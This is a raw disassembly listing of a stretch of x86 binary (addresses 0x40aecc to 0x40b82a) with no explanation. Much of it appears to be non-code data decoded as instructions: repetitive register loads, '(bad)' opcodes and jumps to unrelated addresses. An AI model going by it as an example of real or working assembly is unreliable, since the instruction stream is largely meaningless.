  40aecc:	sbb    bh,BYTE PTR [ecx+0x6bb9b9b9]
  40aed2:	addr16 mov ch,0xb9
  40aed5:	mov    ecx,0x101b5b9
  40aeda:	mov    ch,0xb9
  40aedc:	mov    ecx,0xb9b9b9b9
  40aee1:	add    al,0x13
  40aee3:	xor    esi,DWORD PTR [ebx]
  40aee5:	xor    esi,DWORD PTR [ebx]
  40aee7:	xor    DWORD PTR [ebx+0x6],edi
  40aeea:	push   es
  40aeeb:	push   es
  40aeec:	adc    BYTE PTR [ecx+edi*4],al
  40aeef:	mov    ecx,0x677db1b9
  40aef4:	mov    ch,0xb9
  40aef6:	mov    ch,0x1
  40aef8:	add    DWORD PTR [ebp-0x46464647],esi
  40aefe:	mov    ecx,0x19b5b9b9
  40af03:	add    eax,DWORD PTR [ebx]
  40af05:	xor    esi,DWORD PTR [ebx]
  40af07:	xor    DWORD PTR [ebx],edi
  40af09:	jnp    0x40af11
  40af0b:	push   es
  40af0c:	push   es
  40af0d:	mov    ch,0xb9
  40af0f:	mov    ecx,0x8fa543b9
  40af14:	addr16 mov ch,0x50
  40af17:	lea    eax,[ecx]
  40af19:	mov    ch,0xb9
  40af1b:	mov    ecx,0xb9b9b9b9
  40af20:	mov    ecx,0x3031b04
  40af25:	xor    esi,DWORD PTR [ebx]
  40af27:	xor    esi,DWORD PTR [ecx]
  40af29:	xor    eax,DWORD PTR [esi]
  40af2b:	push   es
  40af2c:	cmp    al,BYTE PTR [ecx+edi*4]
  40af2f:	mov    ecx,0xa53078b9
  40af34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40af35:	addr16 jo 0x40af88
  40af38:	push   eax
  40af39:	add    DWORD PTR [ebp-0x4a4a4a4b],esi
  40af3f:	mov    ecx,0x33db9b9
  40af44:	add    eax,DWORD PTR [ebx]
  40af46:	xor    esi,DWORD PTR [ebx]
  40af48:	xor    esi,DWORD PTR [ebx]
  40af4a:	pop    edx
  40af4b:	push   es
  40af4c:	or     al,0xb9
  40af4e:	mov    ecx,0x4d4bb9b9
  40af53:	xor    BYTE PTR [ebp+0x506767a5],ah
  40af59:	lea    eax,[ecx]
  40af5b:	add    DWORD PTR [ecx],eax
  40af5d:	mov    ch,0xb9
  40af5f:	mov    ecx,0x40b5b9b9
  40af64:	add    eax,DWORD PTR [ebx]
  40af66:	add    eax,0x33333333
  40af6b:	sbb    BYTE PTR [ebp-0x46464647],dh
  40af71:	jg     0x40af94
  40af73:	dec    ebp
  40af74:	xor    BYTE PTR [ebp+0x506767a5],ah
  40af7a:	push   eax
  40af7b:	add    DWORD PTR [ebp-0x46464647],esi
  40af81:	mov    ecx,0x54046b9
  40af86:	add    eax,DWORD PTR ds:0x43a3333
  40af8c:	mov    ecx,0xb9b9b9b9
  40af91:	inc    esi
  40af92:	and    DWORD PTR [ecx],esp
  40af94:	dec    ebp
  40af95:	dec    ebp
  40af96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40af97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40af98:	addr16 addr16 jo 0x40af51
  40af9c:	mov    ecx,0xb9b9b9b9
  40afa1:	mov    ecx,0x3db5b9b9
  40afa6:	sbb    ebx,DWORD PTR [ecx]
  40afa8:	adc    edx,DWORD PTR [ecx]
  40afaa:	add    BYTE PTR [ecx-0x46464647],bh
  40afb0:	mov    ecx,0x213535b3
  40afb5:	dec    ebp
  40afb6:	dec    ebp
  40afb7:	push   0xffffffa5
  40afb9:	addr16 mov ch,0xb9
  40afbc:	mov    ecx,0xb9b9b9b9
  40afc1:	mov    ecx,0xb9b9b9b9
  40afc6:	add    al,0xb5
  40afc8:	add    al,0xb9
  40afca:	mov    ecx,0xb9b9b9b9
  40afcf:	mov    ecx,0x353546b9
  40afd4:	and    DWORD PTR [ecx],esp
  40afd6:	dec    ebp
  40afd7:	dec    ebp
  40afd8:	xor    BYTE PTR [ecx+edi*4-0x47],dl
  40afdc:	mov    ecx,0xb9b9b9b9
  40afe1:	mov    ecx,0xb9b9b9b9
  40afe6:	mov    ecx,0xb9b9b9b9
  40afeb:	mov    ecx,0xb9b9b9b9
  40aff0:	mov    ecx,0x47474746
  40aff5:	xor    eax,0xb9434d21
  40affa:	mov    ecx,0xb9b9b9b9
  40afff:	mov    ecx,0xb9b9b9b9
  40b004:	mov    ecx,0xb9b9b9b9
  40b009:	mov    ecx,0xb9b9b9b9
  40b00e:	mov    ecx,0x4708b9b9
  40b013:	inc    edi
  40b014:	inc    edi
  40b015:	xor    eax,0xb9b94b35
  40b01a:	mov    ecx,0xb9b9b9b9
  40b01f:	mov    ecx,0xb9b9b9b9
  40b024:	mov    ecx,0x4b504b9
  40b029:	mov    ecx,0xb9b9b9b9
  40b02e:	mov    ecx,0x4746b6b6
  40b033:	inc    edi
  40b034:	inc    edi
  40b035:	inc    edi
  40b036:	inc    esi
  40b037:	test   al,0xb6
  40b039:	mov    dh,0xb6
  40b03b:	mov    dh,0xb6
  40b03d:	mov    dh,0xb6
  40b03f:	mov    ecx,0xb9b9b9b9
  40b044:	mov    ch,0xc
  40b046:	sbb    BYTE PTR [esi],al
  40b048:	adc    BYTE PTR [edx],bl
  40b04a:	mov    ch,0xb9
  40b04c:	mov    ecx,0xab6b9b9
  40b051:	inc    esi
  40b052:	inc    edi
  40b053:	inc    edi
  40b054:	inc    edi
  40b055:	cmp    eax,0x47474710
  40b05a:	inc    edi
  40b05b:	inc    edi
  40b05c:	inc    edi
  40b05d:	inc    edi
  40b05e:	mov    dh,0xb9
  40b060:	mov    ecx,0x3e04b9b9
  40b065:	push   es
  40b066:	inc    edi
  40b067:	inc    edi
  40b068:	inc    edi
  40b069:	inc    edi
  40b06a:	adc    BYTE PTR ds:0xb6b9b9b9,bh
  40b070:	or     cl,BYTE PTR [eax]
  40b072:	inc    edi
  40b073:	inc    edi
  40b074:	adc    DWORD PTR [edi+esi*4],ebx
  40b077:	mov    bh,0x40
  40b079:	mov    bh,0xb7
  40b07b:	inc    eax
  40b07c:	mov    bh,0xb7
  40b07e:	mov    dh,0xb9
  40b080:	mov    ecx,0x63cb5b9
  40b085:	push   es
  40b086:	adc    al,0x17
  40b088:	inc    edi
  40b089:	inc    edi
  40b08a:	inc    edi
  40b08b:	adc    BYTE PTR [ebp+0xab6b9b9],dh
  40b091:	or     BYTE PTR [edi+0x11],al
  40b094:	sbb    al,0xb7
  40b096:	mov    bh,0xb7
  40b098:	mov    bh,0xb7
  40b09a:	mov    bh,0xb7
  40b09c:	mov    bh,0xb7
  40b09e:	mov    dh,0xb9
  40b0a0:	mov    ecx,0x3b3311b9
  40b0a5:	add    eax,DWORD PTR [edx+0x53]
  40b0a8:	inc    edx
  40b0a9:	cmp    eax,DWORD PTR [edi+0x47]
  40b0ac:	sbb    bh,BYTE PTR [ecx+0x80ab6b9]
  40b0b2:	adc    DWORD PTR [edi+esi*4],ebx
  40b0b5:	mov    bh,0xb7
  40b0b7:	mov    bh,0xb7
  40b0b9:	mov    bh,0xb7
  40b0bb:	mov    bh,0xb7
  40b0bd:	mov    bh,0xb6
  40b0bf:	mov    ecx,0x331304b9
  40b0c4:	xor    eax,DWORD PTR [eax+edx*4+0x63]
  40b0c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b0c9:	inc    edx
  40b0ca:	inc    edi
  40b0cb:	inc    edi
  40b0cc:	xor    al,0x4
  40b0ce:	mov    ecx,0xa1080ab6
  40b0d3:	mov    bh,0xb7
  40b0d5:	mov    bh,0xb7
  40b0d7:	mov    bh,0xb7
  40b0d9:	mov    bh,0xb7
  40b0db:	mov    bh,0xb7
  40b0dd:	mov    bh,0xb6
  40b0df:	mov    ecx,0x319b5b9
  40b0e4:	add    eax,DWORD PTR [ebp-0x54]
  40b0e7:	ins    DWORD PTR es:[edi],dx
  40b0e8:	gs push ebx
  40b0ea:	inc    edi
  40b0eb:	inc    edi
  40b0ec:	push   es
  40b0ed:	mov    ch,0xb9
  40b0ef:	mov    dh,0x47
  40b0f1:	mov    bh,0xb7
  40b0f3:	mov    bh,0xb7
  40b0f5:	mov    bh,0xb7
  40b0f7:	mov    bh,0xb7
  40b0f9:	mov    bh,0xb7
  40b0fb:	mov    bh,0xb7
  40b0fd:	mov    bh,0xb6
  40b0ff:	mov    ecx,0x51b04b9
  40b104:	add    ecx,DWORD PTR [ecx+0x75]
  40b107:	lods   al,BYTE PTR ds:[esi]
  40b108:	nop
  40b109:	inc    edx
  40b10a:	pop    ss
  40b10b:	pop    ss
  40b10c:	sbb    BYTE PTR [ecx+edi*4],al
  40b10f:	mov    dh,0x47
  40b111:	inc    eax
  40b112:	mov    bh,0xb7
  40b114:	mov    bh,0xb7
  40b116:	mov    bh,0xb7
  40b118:	mov    bh,0xb7
  40b11a:	mov    bh,0xb7
  40b11c:	mov    bh,0xb7
  40b11e:	mov    dh,0xb9
  40b120:	mov    ecx,0x5053db9
  40b125:	fwait
  40b126:	dec    ecx
  40b127:	inc    ebp
  40b128:	inc    esp
  40b129:	add    eax,DWORD PTR [esi]
  40b12b:	adc    al,0xc
  40b12d:	mov    ecx,0xb747b6b9
  40b132:	mov    bh,0xb7
  40b134:	mov    bh,0xb7
  40b136:	mov    bh,0xb7
  40b138:	mov    bh,0xb7
  40b13a:	mov    bh,0xb7
  40b13c:	mov    bh,0xb7
  40b13e:	mov    dh,0xb9
  40b140:	mov    ecx,0x1e1bb5b9
  40b145:	add    eax,0x3b333303
  40b14a:	cmp    edi,DWORD PTR [esi]
  40b14c:	mov    ch,0xb9
  40b14e:	mov    ecx,0xb7b747b6
  40b153:	mov    bh,0xb7
  40b155:	mov    bh,0xb7
  40b157:	mov    bh,0xb7
  40b159:	mov    bh,0xb7
  40b15b:	mov    bh,0xb7
  40b15d:	mov    bh,0xb6
  40b15f:	mov    ecx,0x46b9b9b9
  40b164:	sbb    ebx,DWORD PTR [esi]
  40b166:	add    eax,0x3c333303
  40b16b:	add    al,0xb9
  40b16d:	mov    ecx,0xb747b6b9
  40b172:	mov    bh,0xb7
  40b174:	mov    bh,0xb7
  40b176:	mov    bh,0xb7
  40b178:	mov    bh,0xb7
  40b17a:	mov    bh,0xb7
  40b17c:	mov    bh,0xb7
  40b17e:	mov    dh,0xb9
  40b180:	mov    ecx,0xb5b9b9b9
  40b185:	cmp    eax,0x111b1e1b
  40b18a:	mov    ch,0xb9
  40b18c:	mov    ecx,0x47b6b9b9
  40b191:	inc    edi
  40b192:	inc    edi
  40b193:	inc    edi
  40b194:	inc    edi
  40b195:	inc    edi
  40b196:	inc    edi
  40b197:	inc    edi
  40b198:	inc    edi
  40b199:	inc    edi
  40b19a:	inc    edi
  40b19b:	inc    edi
  40b19c:	inc    edi
  40b19d:	inc    edi
  40b19e:	mov    dh,0xb9
  40b1a0:	mov    ecx,0xb9b9b9b9
  40b1a5:	mov    ecx,0xb904b504
  40b1aa:	mov    ecx,0xb9b9b9b9
  40b1af:	mov    dh,0xb6
  40b1b1:	mov    dh,0xb6
  40b1b3:	mov    dh,0xb6
  40b1b5:	mov    dh,0xb6
  40b1b7:	mov    dh,0xb6
  40b1b9:	mov    dh,0xb6
  40b1bb:	mov    dh,0xb6
  40b1bd:	mov    dh,0xb6
  40b1bf:	mov    ecx,0xb9b9b9b9
  40b1c4:	mov    ecx,0xb9b9b9b9
  40b1c9:	mov    ecx,0xb9b9b9b9
  40b1ce:	mov    ecx,0xb9b9b9b9
  40b1d3:	mov    ecx,0xb9b9b9b9
  40b1d8:	mov    ecx,0xb9b9b9b9
  40b1dd:	mov    ecx,0xffffb9b9
  40b1e2:	(bad)  
  40b1e3:	(bad)  
  40b1e4:	(bad)  
  40b1e5:	(bad)  
  40b1e6:	dec    edi
  40b1e8:	(bad)  
  40b1e9:	(bad)  
  40b1ea:	inc    DWORD PTR [edi-0x78008004]
  40b1f0:	lock pop ds
  40b1f2:	dec    DWORD PTR [edi]
  40b1f4:	loopne 0x40b205
  40b1f6:	mov    edi,0x9e07c00f
  40b1fb:	pop    ds
  40b1fc:	rol    BYTE PTR [edi],0x8e
  40b1ff:	pop    ds
  40b200:	add    BYTE PTR [ebx],0x84
  40b203:	aas    
  40b204:	add    BYTE PTR [ebx],0x80
  40b207:	aas    
  40b208:	add    BYTE PTR [ebx],0x80
  40b20b:	add    eax,eax
  40b20d:	pop    es
  40b20e:	add    BYTE PTR [ebx],0xc0
  40b211:	pop    es
  40b212:	add    BYTE PTR [edi],0xe0
  40b215:	jo     0x8060a22a
  40b21b:	pop    ds
  40b21c:	cld    
  40b21d:	jg     0x40b19f
  40b21f:	aas    
  40b220:	(bad)  
  40b221:	inc    DWORD PTR [eax-0x7f000081]
  40b227:	(bad)  
  40b228:	cld    
  40b229:	jle    0x40b22b
  40b22b:	add    eax,esi
  40b22d:	push   ds
  40b22e:	add    BYTE PTR [ecx],al
  40b230:	loopne 0x40b240
  40b232:	add    BYTE PTR [ecx],al
  40b234:	rol    BYTE PTR [esi],0x0
  40b237:	add    eax,eax
  40b239:	push   es
  40b23a:	add    BYTE PTR [ecx],al
  40b23c:	add    BYTE PTR [edx],0x0
  40b23f:	add    DWORD PTR [eax-0x7ffefffe],eax
  40b245:	add    al,BYTE PTR [eax]
  40b247:	add    eax,eax
  40b249:	push   es
  40b24a:	add    BYTE PTR [ecx],al
  40b24c:	rol    BYTE PTR [esi],0x0
  40b24f:	add    eax,esp
  40b251:	push   cs
  40b252:	add    BYTE PTR [ecx],al
  40b254:	lock push ds
  40b256:	add    BYTE PTR [ecx],al
  40b258:	cld    
  40b259:	jle    0x40b25b
  40b25b:	add    edi,edi
  40b25d:	(bad)  
  40b25e:	(bad)  
  40b25f:	jmp    FWORD PTR [eax]
  40b261:	add    BYTE PTR [eax],al
  40b263:	add    BYTE PTR [eax],bl
  40b265:	add    BYTE PTR [eax],al
  40b267:	add    BYTE PTR [eax],dh
  40b269:	add    BYTE PTR [eax],al
  40b26b:	add    BYTE PTR [ecx],al
  40b26d:	add    BYTE PTR [eax],cl
  40b26f:	add    BYTE PTR [eax],al
  40b271:	add    BYTE PTR [eax],al
  40b273:	add    BYTE PTR [eax+0x2],al
	...
  40b27e:	add    BYTE PTR [eax],al
  40b280:	add    BYTE PTR [ecx],al
  40b282:	add    BYTE PTR [eax],al
  40b284:	add    BYTE PTR [ecx],al
  40b286:	add    BYTE PTR [eax],al
  40b288:	test   BYTE PTR [edi+0x24],dl
  40b28b:	add    BYTE PTR [esi-0x4ffa481],bl
  40b291:	call   0xd638b372
  40b296:	ret    0xbe00
  40b299:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b29a:	lea    eax,[eax]
  40b29c:	call   0xf141a18e
  40b2a1:	icebp  
  40b2a2:	lock add BYTE PTR [ebp-0x13ffd9a7],al
  40b2a9:	out    dx,eax
  40b2aa:	repz add bl,bh
  40b2ad:	out    0xdc,eax
  40b2af:	add    BYTE PTR [edx+edi*2-0x4ffae],bl
  40b2b6:	inc    DWORD PTR [eax]
  40b2b8:	(bad)  
  40b2b9:	stc    
  40b2ba:	test   DWORD PTR [eax],0xebf1fc
  40b2c0:	mov    dh,0x9c
  40b2c2:	jg     0x40b2c4
  40b2c4:	stc    
  40b2c5:	fmulp  st(6),st
  40b2c7:	add    BYTE PTR [eax-0x44ffb38b],bl
  40b2cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b2ce:	mov    al,BYTE PTR [eax]
  40b2d0:	jmp    0xbf41a0c2
  40b2d5:	mov    al,0x9a
  40b2d7:	add    bl,bl
  40b2d9:	jmp    0x40b2b6
  40b2db:	add    BYTE PTR [edx+ecx*8+0x76],dh
  40b2df:	add    BYTE PTR [ecx+ecx*8+0x77],dh
  40b2e3:	add    BYTE PTR [ecx-0x64ffa47f],ah
  40b2e9:	jp     0x40b33c
  40b2eb:	add    ch,bl
  40b2ed:	(bad)  
  40b2ef:	add    bh,ch
  40b2f1:	lock repz add bl,dh
  40b2f5:	repz icebp 
  40b2f7:	add    al,dh
  40b2f9:	cli    
  40b2fa:	inc    DWORD PTR [eax]
  40b2fc:	div    dh
  40b2fe:	hlt    
  40b2ff:	add    BYTE PTR [edx-0x64ff9a77],ch
  40b305:	jns    0x40b35b
  40b307:	add    BYTE PTR [ebp-0x40ff8265],dh
  40b30d:	scas   eax,DWORD PTR es:[edi]
  40b30e:	cwde   
  40b30f:	add    BYTE PTR [edi+ebp*2+0x7b9b0044],dl
  40b316:	push   ebp
  40b317:	add    BYTE PTR [ebx+edi*2+0x7b9d0056],bl
  40b31e:	push   ebp
  40b31f:	add    dh,dh
  40b321:	hlt    
  40b322:	repz add ch,dh
  40b325:	cmc    
  40b326:	repz add BYTE PTR [esi-0x66ff8d6e],ch
  40b32d:	ja     0x40b37f
  40b32f:	add    BYTE PTR [ebp+0x1f007e99],ch
  40b335:	scas   eax,DWORD PTR es:[edi]
  40b336:	and    al,BYTE PTR [eax]
  40b338:	(bad)  
  40b33a:	fild   DWORD PTR [eax]
  40b33c:	shl    esp,1
  40b33e:	rol    DWORD PTR [eax],cl
  40b340:	(bad)  
  40b342:	lds    eax,FWORD PTR [eax]
  40b344:	in     eax,0xd9
  40b346:	iret   
  40b347:	add    BYTE PTR [edx+eiz*4-0x2ff79],bh
  40b34e:	inc    DWORD PTR [eax]
  40b350:	jmp    0xe741a544
  40b355:	out    0xe2,al
  40b357:	add    BYTE PTR [edi],cl
  40b359:	pushf  
  40b35a:	adc    DWORD PTR [eax],eax
  40b35c:	mov    cl,0x97
  40b35e:	jbe    0x40b360
  40b360:	popf   
  40b361:	jg     0x40b3be
  40b363:	add    BYTE PTR [edi-0x14ffd6a5],al
  40b369:	in     eax,dx
  40b36a:	in     eax,dx
  40b36b:	add    BYTE PTR [edi-0x4b],bl
  40b36e:	pusha  
  40b36f:	add    ah,bh
  40b371:	icebp  
  40b372:	jmp    0xe400:0x8999ae00
  40b379:	loope  0x40b357
  40b37b:	add    bh,bh
  40b37d:	stc    
  40b37e:	test   BYTE PTR [eax],0x95
  40b381:	jno    0x40b3cb
  40b383:	add    BYTE PTR [edi-0x70ffb38b],dl
  40b389:	imul   edi,DWORD PTR ds:0xbcdaba00,0xedf0f400
  40b393:	add    cl,ah
  40b395:	in     al,0xe4
  40b397:	add    dl,bh
  40b399:	(bad)  
  40b39b:	add    BYTE PTR [ebp-0x13ff7159],bh
  40b3a1:	repnz in eax,dx
  40b3a3:	add    cl,bh
  40b3a5:	(bad)  
  40b3a6:	inc    DWORD PTR [eax]
  40b3a8:	clc    
  40b3a9:	(bad)  
  40b3aa:	rol    DWORD PTR [eax],0x88
  40b3ad:	pop    ebp
  40b3ae:	sub    al,0x0
  40b3b0:	jecxz  0x40b398
  40b3b2:	in     eax,0x0
  40b3b4:	clc    
  40b3b5:	(bad)  
  40b3b6:	ret    0xf400
  40b3b9:	repnz icebp 
  40b3bb:	add    BYTE PTR [ecx-0x50ffbf95],dl
  40b3c1:	xchg   ebx,eax
  40b3c2:	je     0x40b3c4
  40b3c4:	mov    esi,0xea0091a9
  40b3c9:	in     al,dx
  40b3ca:	jmp    0x40b3cc
  40b3cc:	(bad)  
  40b3cd:	std    
  40b3ce:	std    
  40b3cf:	add    ah,bh
  40b3d1:	(bad)  
  40b3d2:	inc    DWORD PTR [eax]
  40b3d4:	cli    
  40b3d5:	div    ebp
  40b3d7:	add    cl,ah
  40b3d9:	in     al,0xe3
  40b3db:	add    ah,bh
  40b3dd:	stc    
  40b3de:	test   DWORD PTR [eax],0x7394b1
  40b3e4:	test   al,0x89
  40b3e6:	add    BYTE PTR gs:[ebx+eiz*4-0x2827ff78],bh
  40b3ee:	rol    BYTE PTR [eax],cl
  40b3f0:	lds    edi,FWORD PTR [ebx-0x1213ff53]
  40b3f6:	in     eax,dx
  40b3f7:	add    ah,dh
  40b3f9:	div    ch
  40b3fb:	add    BYTE PTR [ebp-0x48ff9676],ah
  40b401:	sahf   
  40b402:	add    DWORD PTR [eax],0xf0f3ed
  40b408:	push   ds
  40b409:	scas   eax,DWORD PTR es:[edi]
  40b40a:	and    DWORD PTR [eax],eax
  40b40c:	mov    eax,0x8b00819e
  40b411:	bound  esi,QWORD PTR [ebx]
  40b413:	add    BYTE PTR [eax-0x76ffb08a],bl
  40b419:	pop    edi
  40b41a:	xor    BYTE PTR [eax],al
  40b41c:	mov    eax,0x8800829e
  40b421:	pop    edi
  40b422:	add    BYTE PTR cs:[eax-0x22ff6428],bl
  40b429:	(bad)  
  40b42b:	add    BYTE PTR [ecx-0x41ffd1a1],cl
  40b431:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b432:	mov    WORD PTR [eax],es
  40b434:	out    dx,eax
  40b435:	out    dx,eax
  40b436:	out    dx,al
  40b437:	add    dh,dh
  40b439:	div    ch
  40b43b:	add    bl,dh
  40b43d:	xrelease lock add BYTE PTR [ebx+ebx*4-0x3328ff84],dh
  40b446:	mov    esp,0xf0f3f400
  40b44b:	add    cl,ch
  40b44d:	jmp    0x9ef5b536
  40b452:	add    DWORD PTR [eax],0xffffffb4
  40b455:	call   0xc0:0xcdd9007a
  40b45c:	mov    WORD PTR [ebx+0x34],fs
  40b45f:	add    BYTE PTR [edi-0x46ff6450],bh
  40b465:	mov    eax,ds:0x7e9d0087
  40b46a:	pop    ecx
  40b46b:	add    bl,ah
  40b46d:	xlat   BYTE PTR ds:[ebx]
  40b46e:	retf   
  40b46f:	add    dh,bh
  40b471:	sti    
  40b472:	sti    
  40b473:	add    BYTE PTR [edx-0x26ffb188],bl
  40b479:	out    0xdd,eax
  40b47b:	add    BYTE PTR [edi+ebp*2-0x60fffba],dl
  40b482:	inc    DWORD PTR [eax]
  40b484:	mov    eax,ds:0xb5005c82
  40b489:	lahf   
  40b48a:	test   BYTE PTR [eax],al
  40b48c:	call   0xee41a07d
  40b491:	lock out dx,eax
  40b493:	add    al,bh
  40b495:	aad    0xc1
  40b497:	add    dl,bh
  40b499:	fmulp  st(6),st
  40b49b:	add    dh,ch
  40b49d:	lock xrelease add BYTE PTR [ebx],bh
  40b4a1:	retf   0x3f
  40b4a4:	mov    ebp,0xed008aa6
  40b4a9:	icebp  
  40b4aa:	repnz add bl,bl
  40b4ad:	int    0xc0
  40b4af:	add    dl,dl
  40b4b1:	in     eax,0xd4
  40b4b3:	add    BYTE PTR [ebp+0x3c008099],ch
  40b4b9:	mov    eax,ds:0xa7b8003d
  40b4be:	xchg   ecx,eax
  40b4bf:	add    BYTE PTR [eax-0x4cffb189],bl
  40b4c5:	call   0xef:0xefef007c
  40b4cc:	cwde   
  40b4cd:	fstp   DWORD PTR [ebx+0x7e9cb600]
  40b4d3:	add    BYTE PTR [ebx+eiz*4],bh
  40b4d6:	cmp    eax,0xe3e9ea00
  40b4db:	add    ch,bh
  40b4dd:	icebp  
  40b4de:	jmp    0x5e00:0x25578500
  40b4e5:	mov    ch,0x60
  40b4e7:	add    BYTE PTR [edi-0x4ff7d61],dh
  40b4ed:	stc    
  40b4ee:	test   DWORD PTR [eax],0x7d9bb4
  40b4f4:	xchg   BYTE PTR [ebx+0x2a],bl
  40b4f7:	add    ah,cl
  40b4f9:	enter  0xbc,0xee
  40b4fd:	idiv   bl
  40b4ff:	add    BYTE PTR [esp+edi*2+0x658d0057],bl
  40b506:	cmp    BYTE PTR [eax],al
  40b508:	into   
  40b509:	mov    edi,0xd7e100ac
  40b50e:	retf   
  40b50f:	add    dh,dh
  40b511:	cli    
  40b512:	sti    
  40b513:	add    bl,ch
  40b515:	lock icebp 
  40b517:	add    BYTE PTR [ebx-0x16ff8266],dh
  40b51d:	out    dx,al
  40b51e:	out    dx,al
  40b51f:	add    BYTE PTR [ecx-0x17ffd0a1],cl
  40b525:	in     eax,dx
  40b526:	jmp    0x40b528
  40b528:	popf   
  40b529:	jnp    0x40b57f
  40b52b:	add    BYTE PTR [edi-0x23ffc398],cl
  40b531:	fstp   st(2)
  40b533:	add    BYTE PTR [eax+ebx*2-0x2105ffdb],al
  40b53a:	int    0x0
  40b53c:	in     al,dx
  40b53d:	out    dx,al
  40b53e:	in     eax,dx
  40b53f:	add    dh,dh
  40b541:	(bad)  
  40b542:	inc    DWORD PTR [eax]
  40b544:	ret    
  40b545:	scas   eax,DWORD PTR es:[edi]
  40b546:	xchg   edi,eax
  40b547:	add    al,dh
  40b549:	icebp  
  40b54a:	lock add BYTE PTR [edi+eiz*4-0x1114ff74],bh
  40b552:	in     eax,dx
  40b553:	add    BYTE PTR [ecx+ebx*4-0xb0bff86],dh
  40b55a:	hlt    
  40b55b:	add    dh,bh
  40b55d:	stc    
  40b55e:	test   BYTE PTR [eax],0xeb
  40b561:	out    dx,eax
  40b562:	lock add BYTE PTR [esi-0x2effd8a7],al
  40b569:	leave  
  40b56a:	mov    ebp,0x8ca7bd00
  40b56f:	add    bh,dh
  40b571:	sar    BYTE PTR [ecx+0x7f9db900],1
  40b577:	add    BYTE PTR [edi-0xff4d4c],bh
  40b57d:	(bad)  
  40b57e:	inc    DWORD PTR [eax]
	...
  40b688:	mov    esi,0x73bebebe
  40b68d:	jae    0x40b702
  40b68f:	jae    0x40b64f
  40b691:	mov    esi,0xbebebebe
  40b696:	mov    esi,0xbebebebe
  40b69b:	mov    esi,0xbebebebe
  40b6a0:	mov    esi,0xa057bebe
  40b6a5:	inc    edx
  40b6a6:	cdq    
  40b6a7:	mov    DWORD PTR [esi-0x42],edx
  40b6aa:	mov    esi,0xbebebebe
  40b6af:	mov    esi,0xbebebe
  40b6b4:	add    BYTE PTR [eax],al
  40b6b6:	mov    esi,0x7bbebebe
  40b6bb:	cmp    al,0x99
  40b6bd:	mov    ds:0xe1b991b,al
  40b6c2:	mov    esi,0xbebebebe
  40b6c7:	mov    esi,0xba00bebe
  40b6cc:	mov    edx,0xbebebe00
  40b6d1:	mov    cl,0x21
  40b6d3:	mov    ds:0x1b1b1ba3,al
  40b6d8:	cdq    
  40b6d9:	das    
  40b6da:	push   cs
  40b6db:	mov    esi,0xbebe64be
  40b6e0:	mov    esi,0xba00be
  40b6e5:	mov    esi,0x25bebebe
  40b6ea:	inc    ebx
  40b6eb:	mov    ds:0x1b1bb2b2,eax
  40b6f0:	mov    ds:0xbebe451b,al
  40b6f5:	bound  esp,QWORD PTR [esi-0x45544142]
  40b6fb:	mov    edx,0xbebebe00
  40b700:	mov    esi,0xb2b24325
  40b705:	mov    dl,0xa3
  40b707:	sbb    ebx,DWORD PTR [ebx]
  40b709:	sbb    ecx,DWORD PTR [edi-0x42]
  40b70c:	mov    esi,0xbea64b9f
  40b711:	stos   DWORD PTR es:[edi],eax
  40b712:	mov    edx,0xbebebe00
  40b717:	mov    esi,0x9d8db1be
  40b71c:	xor    DWORD PTR [edx+0x2e99b2b2],0xa9bebe65
  40b726:	test   BYTE PTR [ebx-0x5a],cl
  40b729:	mov    edx,0xbebe00ba
  40b72e:	mov    esi,0x8ebebebe
  40b733:	pop    ecx
  40b734:	xor    dh,BYTE PTR [edx+0xe71a332]
  40b73a:	mov    esi,0x24dbebe
  40b73f:	test   BYTE PTR [ebx-0x46],cl
  40b742:	fwait
  40b743:	mov    esi,0xbebebebe
  40b748:	mov    esi,0x5a5dbebe
  40b74d:	stos   BYTE PTR es:[edi],al
  40b74e:	inc    ebx
  40b74f:	mov    eax,0xbebebe73
  40b754:	mov    esi,0x84020d4d
  40b759:	dec    ebx
  40b75a:	mov    edx,0xab9b
  40b75f:	mov    esi,0xbebebebe
  40b764:	jae    0x40b7dd
  40b766:	push   cs
  40b767:	ja     0x40b727
  40b769:	mov    esi,0x3ebebebe
  40b76e:	cmp    eax,0x4b84020d
  40b773:	mov    edx,0xbebeabba
  40b778:	mov    esi,0xbebebebe
  40b77d:	mov    esi,0xbebebebe
  40b782:	mov    esi,0x993ebebe
  40b787:	cdq    
  40b788:	or     eax,0xa64b8402
  40b78d:	mov    esi,0xbebebebe
  40b792:	mov    esi,0xbebebebe
  40b797:	mov    esi,0xbebebebe
  40b79c:	mov    esi,0x99999925
  40b7a1:	or     eax,0xbebe6209
  40b7a6:	mov    esi,0xbebebebe
  40b7ab:	mov    esi,0xbebebebe
  40b7b0:	mov    esi,0xbebebebe
  40b7b5:	and    eax,0x99999999
  40b7ba:	dec    ebp
  40b7bb:	mov    esi,0xbebebebe
  40b7c0:	mov    esi,0x73bebebe
  40b7c5:	mov    cl,0xb1
  40b7c7:	gs mov esi,0xbebebebe
  40b7cd:	sahf   
  40b7ce:	cdq    
  40b7cf:	cdq    
  40b7d0:	cdq    
  40b7d1:	ds mov esi,0xbebebebe
  40b7d7:	mov    esi,0x4ebebebe
  40b7dc:	mov    eax,0xb12f9999
  40b7e1:	mov    esi,0x9ebebebe
  40b7e6:	cdq    
  40b7e7:	cdq    
  40b7e8:	sahf   
  40b7e9:	push   edi
  40b7ea:	gs mov ebx,0xbebbbbbb
  40b7f0:	mov    esi,0x999425be
  40b7f5:	sbb    edx,DWORD PTR [ecx+ebx*4]
  40b7f8:	cdq    
  40b7f9:	ja     0x40b7b9
  40b7fb:	mov    esi,0x1997fbe
  40b800:	cdq    
  40b801:	cdq    
  40b802:	cdq    
  40b803:	cdq    
  40b804:	cdq    
  40b805:	cdq    
  40b806:	ja     0x40b7c6
  40b808:	mov    esi,0x2c991377
  40b80d:	xchg   edi,eax
  40b80e:	xchg   ebx,eax
  40b80f:	inc    ecx
  40b810:	cdq    
  40b811:	das    
  40b812:	push   cs
  40b813:	mov    esi,0x3b7f01be
  40b818:	mov    esp,0xbcbcbcbc
  40b81d:	mov    esp,0x8ebebe65
  40b822:	mov    dl,0xa3
  40b824:	push   ss
  40b825:	pusha  
  40b826:	xor    al,0x93
  40b828:	adc    al,0x99
  40b82a:	dec    edi
